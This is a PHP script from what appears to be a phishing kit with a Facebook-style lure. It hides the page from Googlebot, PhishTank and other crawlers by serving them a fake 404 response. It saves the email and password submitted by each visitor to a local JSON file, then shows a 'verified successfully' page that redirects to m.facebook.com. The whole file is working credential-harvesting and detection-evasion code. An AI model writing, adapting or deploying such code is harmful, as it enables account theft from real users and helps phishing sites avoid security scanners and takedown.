<?php
session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS ||-----------------------------------------------------//
include "../anti/antibots1.php";
include "../anti/antibots2.php";
include "../anti/antibots3.php";
include "../anti/antibots4.php";
include "../anti/antibots5.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
	'phishtank',
	'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 

function geraURL($tamanho = 100, $maiusculas = true, $numeros = true, $simbolos = true){ 
    $lmin = 'abcdefghijklmnopqrstuvwxyz'; 
    $lmai = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
    $num = '1234567890'; 
    $simb = '#-/'; 
    $retorno = ''; 
    $caracteres = ''; 
     
    $caracteres .= $lmin; 
        if ($maiusculas) $caracteres .= $lmai; 
        if ($numeros) $caracteres .= $num; 
        if ($simbolos) $caracteres .= $simb; 
     
    $len = strlen($caracteres); 
    for ($n = 1; $n <= $tamanho; $n++) { 
    $rand = mt_rand(1, $len); 
    $retorno .= $caracteres[$rand-1]; 
    } 
    return $retorno; 
} 
$url = geraURL(87); 
?>

<?php
$email = $_POST['email'];
$senha = $_POST['senha'];

    $fl = "hugo/seguro/login846379462.json";
    if(file_exists($fl)){
        $h = fopen($fl, "r");
        $arr = json_decode(fread($h, filesize ($fl)));
        array_push($arr,array($email, $senha));
        fclose($h);
    } else {
        $arr = array(
            array($email, $senha)
        );
    }
    $fhs = fopen($fl, 'w') or die("can't open file");
    fwrite($fhs, json_encode($arr));
    fclose($fhs);
     ?>

     
<!DOCTYPE html>
<html>
 <head> 
  <title>Verificado com sucesso </title> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no"> 
  <meta http-equiv="refresh" content="1, url='https://m.facebook.com'"> 
  <link rel="shortcut icon" href="assets/imagenss/ico_favicon.png"> 
  <link rel="stylesheet" type="text/css" href="../assets/css/benef_compras_style.css"> 
 </head> 



</html>